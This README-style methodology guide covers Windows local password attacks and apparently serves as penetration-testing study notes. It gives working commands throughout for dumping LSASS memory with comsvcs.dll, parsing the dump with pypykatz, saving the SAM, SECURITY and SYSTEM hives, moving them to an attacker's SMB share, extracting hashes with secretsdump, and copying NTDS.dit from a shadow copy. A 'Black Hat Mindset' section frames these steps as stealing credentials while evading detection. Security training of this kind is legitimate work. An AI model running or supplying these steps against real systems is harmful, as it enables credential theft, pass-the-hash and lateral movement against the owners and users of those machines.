# Basic Methodology - Windows Local Password Attack

This README explores techniques for local password attacks on Windows systems, focusing on enumerating processes, dumping memory, extracting credentials from registry hives, and accessing the NTDS.dit file.

## Table of Contents

- [Introduction](#introduction)
- [Setup and Prerequisites](#setup-and-prerequisites)
- [Listing Running Processes](#listing-running-processes)
- [Searching for Passwords in Files](#searching-for-passwords-in-files)
- [Enumerating the LSASS Process](#enumerating-the-lsass-process)
- [Dumping LSASS Memory](#dumping-lsass-memory)
- [Extracting Credentials from LSASS Dump](#extracting-credentials-from-lsass-dump)
- [Saving Registry Hives](#saving-registry-hives)
- [Transferring Files to a Share](#transferring-files-to-a-share)
- [Dumping SAM Hashes with Secretsdump](#dumping-sam-hashes-with-secretsdump)
- [Creating a Volume Shadow Copy](#creating-a-volume-shadow-copy)
- [Copying NTDS.dit from Shadow Copy](#copying-ntdsdit-from-shadow-copy)
- [Black Hat Mindset](#black-hat-mindset)
- [Resources](#resources)

## Introduction

Local password attacks on Windows systems involve extracting credentials and password hashes from memory, registry hives, and Active Directory databases (NTDS.dit). This guide covers enumerating processes, dumping LSASS memory, saving registry hives, and accessing NTDS.dit using volume shadow copies, enabling attackers to steal credentials for privilege escalation or lateral movement.

## Setup and Prerequisites

- **Environment**: Windows host with local access; some commands (e.g., `secretsdump.py`) run on a Linux attack box.
- **Tools**: Install Python 3 (for `secretsdump.py` and `pypykatz`), download pypykatz (e.g., `pip install pypykatz`), and `secretsdump.py` (from Impacket, e.g., `pip install impacket`).
- **Permissions**: Administrative privileges are required for most commands (e.g., LSASS dumping, registry access, VSS).
- **Files**: Ensure output paths (e.g., `C:\lsass.dmp`, `C:\sam.save`) are writable; set up an SMB share for file transfers.
- **IP Address**: Identify the attack host IP (e.g., `<ip>`) for file transfers.

## Listing Running Processes

Enumerate running processes to identify targets like LSASS.

```powershell
tasklist /svc
```

Example Output:
```
lsass.exe           672    LsaSs
svchost.exe         844    RpcSs
```

## Searching for Passwords in Files

Search for plaintext passwords in various file types.

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

Example Output:
```
config.xml:5: password=admin123
```

## Enumerating the LSASS Process

Identify the LSASS process for memory dumping.

```powershell
Get-Process lsass
```

Example Output:
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  ProcessName
-------  ------    -----      -----     ------     --  -----------
    543      12      2048       4096         15    672  lsass
```

## Dumping LSASS Memory

Create a memory dump of the LSASS process.

```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Note: Replace `672` with the actual LSASS PID from `Get-Process` or `tasklist`.

## Extracting Credentials from LSASS Dump

Parse the LSASS dump to extract credentials.

```bash
pypykatz lsa minidump /path/to/lsassdumpfile
```

Example:
```bash
pypykatz lsa minidump /root/lsass.dmp
```

Output: Extracts hashes like `Administrator:31d6cfe0d16ae931b73c59d7e0c089c0`.

## Saving Registry Hives

Save registry hives for offline credential extraction.

```powershell
reg.exe save hklm\sam C:\sam.save
```

Additional Hives:
```powershell
reg.exe save hklm\security C:\security.save
reg.exe save hklm\system C:\system.save
```

## Transferring Files to a Share

Move saved files to an attack host share.

```powershell
move sam.save \\<ip>\NameofFileShare
```

Example:
```powershell
move sam.save \\192.168.1.200\CompData
```

## Dumping SAM Hashes with Secretsdump

Extract password hashes from registry hives.

```bash
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

Example Output:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

## Creating a Volume Shadow Copy

Create a shadow copy to safely access NTDS.dit.

```powershell
vssadmin CREATE SHADOW /For=C:
```

Example Output:
```
Successfully created shadow copy for 'C:\'
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
```

## Copying NTDS.dit from Shadow Copy

Extract NTDS.dit from the shadow copy.

```powershell
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Note: Replace `HarddiskVolumeShadowCopy2` with the actual shadow copy volume name from `vssadmin`.

## Black Hat Mindset

- **Extract Credentials**: Dump LSASS memory and registry hives to steal password hashes for cracking or pass-the-hash attacks.
- **Access Domain Data**: Use shadow copies to safely extract NTDS.dit and harvest domain credentials.
- **Transfer Files**: Move dumps to an attack host for offline analysis, minimizing detection.
- **Stay Silent**: Use native tools (`rundll32`, `reg.exe`) to blend in with normal system activity.

## Resources

- [Pypykatz GitHub](https://github.com/skelsec/pypykatz)
- [Impacket GitHub](https://github.com/SecureAuthCorp/impacket)
- [VSSAdmin Documentation](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin)
- [Windows Command Line](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands)

